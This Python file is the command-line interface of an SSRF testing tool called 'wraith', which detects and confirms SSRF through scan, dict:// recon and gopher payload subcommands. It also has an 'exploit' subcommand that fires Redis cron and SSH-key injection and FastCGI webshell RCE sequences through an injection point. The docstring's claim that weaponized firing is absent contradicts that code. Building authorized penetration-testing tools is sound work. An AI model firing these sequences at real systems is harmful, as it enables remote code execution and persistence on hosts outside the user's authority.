"""wraith command-line interface.

[Worker decision: argparse, not Click, matching the suite convention (ferryman,
enshroud) and keeping the dependency surface tight. The interface is a set of
subcommands mirroring the V0.1-CRITERIA.md capability groups:

    scan    -- detect + CONFIRM SSRF (criteria #1-#4, #6): a raw HTTP request
               file OR a target URL, an explicitly markable injection point, and
               opt-in flags for the cloud-metadata probes (#3), the interactsh
               OOB confirmation engine (#4), and the MCP detection catalog (#6).
    dict    -- dict:// read-only recon (criteria #5): port/banner, Redis INFO,
               Memcached stats. Read-only by definition.
    gopher  -- gopher:// payload GENERATOR (criteria #5): RESP / FastCGI byte
               encoders. Dry-run by default and the ONLY v0.1 mode -- it emits a
               payload for the operator and never fires a weaponized sequence
               (weaponization is deferred to v0.2 behind --exploit; see the
               "Explicitly NOT in v0.1" list).

The handlers are wired to the v0.1 engine: ``scan`` runs the mutator engine +
cloud-metadata probes + OOB confirmation (+ the MCP catalog with ``--mcp``);
``dict`` runs read-only dict:// recon; ``gopher`` emits a dry-run payload. Heavy
modules are imported lazily inside each handler so ``--version`` / ``--help``
stay fast and dependency-light.]

Exit codes:
    0  a handler completed (with or without findings)
    2  usage / argument error, missing/empty scope, or no subcommand given
"""

from __future__ import annotations

import argparse
from typing import Sequence

from wraith import __version__


def _add_target_group(sub: argparse.ArgumentParser) -> None:
    """Shared 'where do I inject' options (criteria #1: input flexibility)."""
    group = sub.add_argument_group("target / injection point")
    group.add_argument(
        "-u",
        "--target",
        metavar="URL",
        help="target URL to test (mutually complementary with --request-file)",
    )
    group.add_argument(
        "-r",
        "--request-file",
        metavar="FILE",
        dest="request_file",
        help="raw HTTP request file to replay (SSRFmap parity)",
    )
    group.add_argument(
        "--marker",
        metavar="STR",
        default="FUZZ",
        help=(
            "injection marker: the literal token in the URL/request that wraith "
            "replaces with each payload variant (default: FUZZ)"
        ),
    )
    group.add_argument(
        "--param",
        metavar="NAME",
        help=(
            "explicitly mark the injection point by name -- a query param, "
            "header, body field, or path segment (criteria #1)"
        ),
    )
    group.add_argument(
        "--scope-file",
        metavar="FILE",
        dest="scope_file",
        help=(
            "scope allowlist (one host/CIDR per line, '#' comments); scope is "
            "enforced before ANY request via scan-primitives"
        ),
    )


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        prog="wraith",
        description=(
            "SSRF detection and out-of-band confirmation for the cloud-metadata, "
            "protocol-smuggling, and MCP attack surface. Detects and CONFIRMS "
            "SSRF and emits suite-standard findings (SARIF 2.1.0 + HackerOne "
            "markdown). Detect-and-confirm only: no weaponization (see the "
            "roadmap / V0.1-CRITERIA.md cut line)."
        ),
        epilog="Authorized testing only. You are responsible for your scope.",
    )
    parser.add_argument(
        "--version",
        action="version",
        version=f"wraith {__version__}",
    )

    sub = parser.add_subparsers(dest="command", metavar="COMMAND")

    # -- scan: detect + confirm SSRF -------------------------------------------
    scan = sub.add_parser(
        "scan",
        help="detect and confirm SSRF (mutator engine + probes + OOB)",
        description=(
            "Run the SSRF filter-bypass mutator engine against a marked "
            "injection point and confirm hits out-of-band. Emits suite-standard "
            "findings (see V0.1-CRITERIA.md #2-#4, #6)."
        ),
    )
    _add_target_group(scan)
    scan.add_argument(
        "--cloud-metadata",
        action="store_true",
        dest="cloud_metadata",
        help=(
            "run the cloud-metadata detection probes (AWS IMDSv1/IMDSv2, GCP, "
            "Azure, Alibaba, Oracle, DigitalOcean) -- criteria #3"
        ),
    )
    scan.add_argument(
        "--oob",
        metavar="COLLAB_URL",
        help=(
            "interactsh-compatible OOB collaborator URL for blind-SSRF "
            "confirmation; a DNS-only callback still counts as CONFIRMED "
            "(criteria #4)"
        ),
    )
    scan.add_argument(
        "--mcp",
        action="store_true",
        help=(
            "enable MCP / AI-infra detection: (1) probe the target's SSRF injection "
            "point for internal MCP servers at well-known discovery paths "
            "(/mcp, /__mcp, /.well-known/mcp.json, …) and (2) run the 5-CVE "
            "MCP catalog against the target as an MCP server endpoint (criteria #6)"
        ),
    )
    scan.add_argument(
        "--mcp-host",
        metavar="HOST",
        dest="mcp_host",
        default="127.0.0.1",
        help=(
            "internal host to probe for MCP servers via SSRF discovery (default: 127.0.0.1). "
            "Used with --mcp; set to a known internal host/IP if 127.0.0.1 is not the target."
        ),
    )
    scan.add_argument(
        "--mcp-port",
        metavar="PORT",
        dest="mcp_port",
        type=int,
        default=None,
        help="TCP port for --mcp-host MCP server discovery (default: no port specified)",
    )
    scan.add_argument(
        "--concurrency",
        type=int,
        default=10,
        metavar="N",
        help="max concurrent in-flight requests (criteria #7; default: 10)",
    )
    scan.add_argument(
        "--format",
        choices=("json", "text", "h1md", "sarif"),
        default="json",
        dest="output_format",
        help="output format for findings (default: json)",
    )
    scan.add_argument(
        "--rate-limit",
        type=float,
        dest="rate_limit",
        metavar="RPS",
        help="max requests/second (shared token bucket; default: unlimited)",
    )
    scan.add_argument(
        "--proxy",
        metavar="URL",
        help="route traffic through an http/https/socks proxy (Caido/Burp)",
    )
    scan.set_defaults(handler=_cmd_scan)

    # -- dict: read-only recon -------------------------------------------------
    dict_cmd = sub.add_parser(
        "dict",
        help="dict:// read-only recon (port/banner, Redis INFO, Memcached stats)",
        description=(
            "Read-only dict:// recon through an SSRF primitive. Read-only by "
            "definition -- no state change (see V0.1-CRITERIA.md #5)."
        ),
    )
    dict_cmd.add_argument(
        "-u", "--target", required=True, metavar="URL", help="target URL to probe"
    )
    dict_cmd.add_argument(
        "--marker",
        metavar="STR",
        default="FUZZ",
        help="injection marker replaced by each dict:// recon payload (default: FUZZ)",
    )
    dict_cmd.add_argument(
        "--param",
        metavar="NAME",
        help="mark the injection point by query-param name (instead of --marker)",
    )
    dict_cmd.add_argument(
        "--host",
        default="127.0.0.1",
        help="internal host to recon through the SSRF (default: 127.0.0.1)",
    )
    dict_cmd.add_argument(
        "--scope-file",
        metavar="FILE",
        dest="scope_file",
        help="scope allowlist enforced before any request",
    )
    dict_cmd.set_defaults(handler=_cmd_dict)

    # -- gopher: payload generator (dry-run only) ------------------------------
    gopher = sub.add_parser(
        "gopher",
        help="gopher:// payload generator (dry-run only; emits, never fires)",
        description=(
            "Generate a gopher:// payload (RESP / FastCGI byte encoding, correct "
            "CRLF %0d%0a, single/double URL-encode toggle) and print it for the "
            "operator. DRY-RUN ONLY in v0.1 -- weaponized firing is deferred to "
            "v0.2 behind --exploit (see V0.1-CRITERIA.md #5)."
        ),
    )
    gopher.add_argument(
        "--protocol",
        choices=("redis", "fastcgi"),
        required=True,
        help="payload protocol to encode",
    )
    gopher.add_argument(
        "--dry-run",
        action="store_true",
        default=True,
        dest="dry_run",
        help="emit the payload only; never fire it (default and only v0.1 mode)",
    )
    gopher.add_argument(
        "--double-encode",
        action="store_true",
        dest="double_encode",
        help="URL-encode the payload twice (single-encode is the default)",
    )
    gopher.add_argument(
        "--host",
        default="127.0.0.1",
        help="target host embedded in the gopher URL (default: 127.0.0.1)",
    )
    gopher.add_argument(
        "--port",
        type=int,
        help="target port (default: 6379 for redis, 9000 for fastcgi)",
    )
    gopher.add_argument(
        "--command",
        action="append",
        dest="commands",
        metavar="CMD",
        help="redis: a command to encode, repeatable (default: 'INFO'), e.g. --command 'SET k v'",
    )
    gopher.add_argument(
        "--script",
        default="/var/www/html/index.php",
        help="fastcgi: SCRIPT_FILENAME to encode (default: /var/www/html/index.php)",
    )
    gopher.set_defaults(handler=_cmd_gopher)

    # -- exploit: weaponized gopher:// sequences (--exploit gate required) ----
    exploit = sub.add_parser(
        "exploit",
        help="fire weaponized gopher:// sequences (--exploit gate required)",
        description=(
            "Fire weaponized gopher:// exploit sequences (Redis cron/SSH injection, "
            "FastCGI php-fpm RCE) through an SSRF injection point. "
            "Requires the explicit --exploit flag to opt in. "
            "Prints a confirmation prompt to stderr unless --yes/-y is passed. "
            "Authorized testing only."
        ),
        epilog=(
            "Warning: --exploit fires live attack payloads that may cause remote "
            "code execution, data loss (FLUSHALL), or privilege escalation. "
            "You are responsible for your scope and authorization."
        ),
    )
    exploit.add_argument(
        "--exploit",
        action="store_true",
        default=False,
        dest="exploit_gate",
        help=(
            "explicit required opt-in flag; the exploit subcommand exits with "
            "an error unless --exploit is present on the command line"
        ),
    )
    exploit.add_argument(
        "-y", "--yes",
        action="store_true",
        default=False,
        dest="yes",
        help="skip the confirmation prompt (for scripted/CI use)",
    )
    exploit.add_argument(
        "--sequence",
        choices=("redis-cron", "redis-ssh", "fastcgi-rce"),
        required=True,
        metavar="SEQ",
        help="exploit sequence: redis-cron | redis-ssh | fastcgi-rce",
    )
    exploit.add_argument(
        "--host",
        default="127.0.0.1",
        help="internal Redis/FastCGI host to target (default: 127.0.0.1)",
    )
    exploit.add_argument(
        "--port",
        type=int,
        help="internal port (default: 6379 for redis-*, 9000 for fastcgi-rce)",
    )
    exploit.add_argument(
        "--double-encode",
        action="store_true",
        dest="double_encode",
        help="URL-encode the gopher payload twice",
    )
    exploit.add_argument(
        "--exploit-redis-cron-dir",
        default="/etc/cron.d/",
        metavar="DIR",
        dest="redis_cron_dir",
        help="cron drop dir for redis-cron (default: /etc/cron.d/)",
    )
    exploit.add_argument(
        "--exploit-redis-cron-entry",
        metavar="ENTRY",
        dest="redis_cron_entry",
        help="cron entry line(s) to inject (required for redis-cron)",
    )
    exploit.add_argument(
        "--exploit-redis-ssh-key",
        metavar="PUBKEY",
        dest="redis_ssh_key",
        help="SSH public key to inject into /root/.ssh/authorized_keys (required for redis-ssh)",
    )
    exploit.add_argument(
        "--exploit-fcgi-cmd",
        metavar="CMD",
        dest="fcgi_cmd",
        help="shell command to execute via the PHP webshell (required for fastcgi-rce)",
    )
    exploit.add_argument(
        "--exploit-fcgi-webshell-path",
        default="/var/www/html/shell.php",
        metavar="PATH",
        dest="fcgi_webshell_path",
        help="SCRIPT_FILENAME for the FastCGI request (default: /var/www/html/shell.php)",
    )
    _add_target_group(exploit)
    exploit.set_defaults(handler=_cmd_exploit)

    return parser


def _load_scope_or_exit(scope_file: str | None):
    """Return a Scope from ``scope_file`` or a (message, exit-code) on failure.

    Scope is safety-critical: a scan with no authorized scope is refused
    (fail-closed) so wraith cannot touch an out-of-scope target.
    """
    import sys

    from wraith.client import build_scope

    if not scope_file:
        print(
            "error: --scope-file is required (scope is enforced before any request)",
            file=sys.stderr,
        )
        return None
    scope = build_scope(scope_file=scope_file)
    if len(scope) == 0:
        print(
            "error: scope file has no valid entries; refusing to scan (fail-closed)",
            file=sys.stderr,
        )
        return None
    return scope


def _emit(findings, fmt: str) -> None:
    """Render findings to stdout in the requested format."""
    import json

    from wraith.reporting import to_h1md
    from wraith.sarif import to_sarif

    if fmt == "json":
        print(json.dumps([f.to_dict() for f in findings], indent=2))
    elif fmt == "sarif":
        print(json.dumps(to_sarif(findings), indent=2))
    elif fmt == "h1md":
        print(to_h1md(findings))
    else:  # text
        if not findings:
            print("no findings")
        for f in findings:
            state = "CONFIRMED" if f.oob_proof else "detected"
            print(
                f"[{f.severity.upper()}] {f.title} ({state}) "
                f"variant={f.variant} target={f.target}"
            )
            if f.oob_proof:
                print(f"    oob-proof: {f.oob_proof}")


def _build_collaborator(oob_url: str | None):
    if not oob_url:
        return None
    from wraith.oob import InteractshClient, InteractshConfig

    return InteractshClient(InteractshConfig(server=oob_url))


def _cmd_scan(args: argparse.Namespace) -> int:
    """Detect + confirm SSRF (criteria #1-#4, #6)."""
    import asyncio
    import sys
    from urllib.parse import urlsplit

    from wraith.engine import Target, run_scan
    from wraith.mcp import scan_mcp

    if not args.target and not args.request_file:
        print("error: one of -u/--target or -r/--request-file is required", file=sys.stderr)
        return 2
    scope = _load_scope_or_exit(args.scope_file)
    if scope is None:
        return 2

    if args.request_file:
        target = Target.from_request_file(
            args.request_file, marker=args.marker, param=args.param
        )
    else:
        target = Target.from_url(args.target, marker=args.marker, param=args.param)

    collaborator = _build_collaborator(args.oob)
    try:
        # Always run the core engine (mutator + OOB + metadata + MCP discovery).
        # When --mcp is set, also enable internal MCP server discovery probing.
        core_findings = asyncio.run(
            run_scan(
                target,
                scope,
                rate_limit=args.rate_limit,
                proxy=args.proxy,
                concurrency=args.concurrency,
                cloud_metadata=args.cloud_metadata,
                collaborator=collaborator,
                mcp_discovery=bool(args.mcp),
                mcp_discovery_host=getattr(args, "mcp_host", "127.0.0.1"),
                mcp_discovery_port=getattr(args, "mcp_port", None),
            )
        )
        # When --mcp is set, also run the CVE-based MCP catalog against the
        # target as an MCP server (original --mcp behavior: tests the target's
        # own MCP endpoints for SSRF sinks). Merge results.
        if args.mcp:
            parts = urlsplit(target.url)
            base = f"{parts.scheme}://{parts.netloc}"
            mcp_findings = asyncio.run(
                scan_mcp(
                    base,
                    scope,
                    collaborator=collaborator,
                    cloud_metadata=args.cloud_metadata,
                    concurrency=args.concurrency,
                )
            )
            seen = {f.id for f in core_findings}
            findings = core_findings + [f for f in mcp_findings if f.id not in seen]
        else:
            findings = core_findings
    finally:
        if collaborator is not None:
            collaborator.close()

    _emit(findings, args.output_format)
    return 0


def _cmd_dict(args: argparse.Namespace) -> int:
    """dict:// read-only recon through an SSRF injection point (criteria #5)."""
    import asyncio

    from wraith.engine import Target
    from wraith.protocols import dict_recon

    scope = _load_scope_or_exit(args.scope_file)
    if scope is None:
        return 2

    target = Target.from_url(args.target, marker=args.marker, param=args.param)
    findings = asyncio.run(dict_recon(target, scope, host=args.host))
    _emit(findings, "text")
    return 0


def _cmd_gopher(args: argparse.Namespace) -> int:
    """gopher:// payload generator -- DRY-RUN only (criteria #5)."""
    from wraith.protocols import fastcgi_encode, gopher_payload, resp_encode

    if args.protocol == "redis":
        port = args.port or 6379
        commands = [c.split() for c in (args.commands or ["INFO"])]
        data = resp_encode(commands)
    else:  # fastcgi
        port = args.port or 9000
        data = fastcgi_encode(
            {
                "SCRIPT_FILENAME": args.script,
                "REQUEST_METHOD": "GET",
                "GATEWAY_INTERFACE": "CGI/1.1",
            }
        )
    payload = gopher_payload(args.host, port, data, double_encode=args.double_encode)
    print("# wraith gopher payload -- DRY-RUN (emitted for the operator, never fired)")
    print(
        f"# protocol={args.protocol} host={args.host} port={port} "
        f"double_encode={args.double_encode}"
    )
    print(payload)
    return 0


def _cmd_exploit(args: argparse.Namespace) -> int:
    """Fire a weaponized gopher:// exploit sequence (v0.2, --exploit gate)."""
    import sys

    # Gate: --exploit must be explicitly present on the CLI.
    if not args.exploit_gate:
        print(
            "error: --exploit is required to fire weaponized sequences "
            "(this fires live attack payloads that may cause RCE). "
            "Pass --exploit to opt in.",
            file=sys.stderr,
        )
        return 2

    # Confirmation prompt (skipped by --yes/-y for scripted/CI use).
    if not args.yes:
        print(
            "Warning: --exploit fires live attack payloads that may cause "
            "remote code execution. Are you sure? [y/N] ",
            end="",
            file=sys.stderr,
            flush=True,
        )
        try:
            answer = input()
        except (EOFError, KeyboardInterrupt):
            answer = ""
        if answer.strip().lower() not in ("y", "yes"):
            print("Aborted.", file=sys.stderr)
            return 1

    from wraith.exploit import fastcgi_rce_payload, redis_cron_payload, redis_ssh_payload

    seq = args.sequence
    host = args.host
    double_encode = args.double_encode

    if seq == "redis-cron":
        port = args.port or 6379
        if not args.redis_cron_entry:
            print(
                "error: --exploit-redis-cron-entry is required for the redis-cron sequence",
                file=sys.stderr,
            )
            return 2
        payload = redis_cron_payload(
            host,
            port,
            args.redis_cron_dir,
            args.redis_cron_entry,
            double_encode=double_encode,
        )
    elif seq == "redis-ssh":
        port = args.port or 6379
        if not args.redis_ssh_key:
            print(
                "error: --exploit-redis-ssh-key is required for the redis-ssh sequence",
                file=sys.stderr,
            )
            return 2
        payload = redis_ssh_payload(
            host,
            port,
            args.redis_ssh_key,
            double_encode=double_encode,
        )
    else:  # fastcgi-rce
        port = args.port or 9000
        if not args.fcgi_cmd:
            print(
                "error: --exploit-fcgi-cmd is required for the fastcgi-rce sequence",
                file=sys.stderr,
            )
            return 2
        payload = fastcgi_rce_payload(
            host,
            port,
            args.fcgi_cmd,
            webshell_path=args.fcgi_webshell_path,
            double_encode=double_encode,
        )

    print("# wraith exploit payload (WEAPONIZED -- fires live attack sequence)")
    print(f"# sequence={seq} host={host} port={port}")
    print(payload)

    # Optional: fire through an SSRF injection point (scope-enforced).
    if args.target:
        import asyncio

        from wraith.client import get_client
        from wraith.engine import Target

        scope = _load_scope_or_exit(args.scope_file)
        if scope is None:
            return 2

        target_obj = Target.from_url(args.target, marker=args.marker, param=args.param)
        method, url, headers, body = target_obj.build_request(payload)

        async def _fire() -> None:
            client = get_client(scope)
            try:
                resp = await client.request(method, url, headers=headers or None, content=body)
                print(f"# fired: HTTP {resp.status_code}", file=sys.stderr)
            finally:
                await client.aclose()

        asyncio.run(_fire())

    return 0


def main(argv: Sequence[str] | None = None) -> int:
    parser = build_parser()
    args = parser.parse_args(argv)

    handler = getattr(args, "handler", None)
    if handler is None:
        # No subcommand given: print help and signal a usage error.
        parser.print_help()
        return 2

    return handler(args)


if __name__ == "__main__":  # pragma: no cover
    raise SystemExit(main())
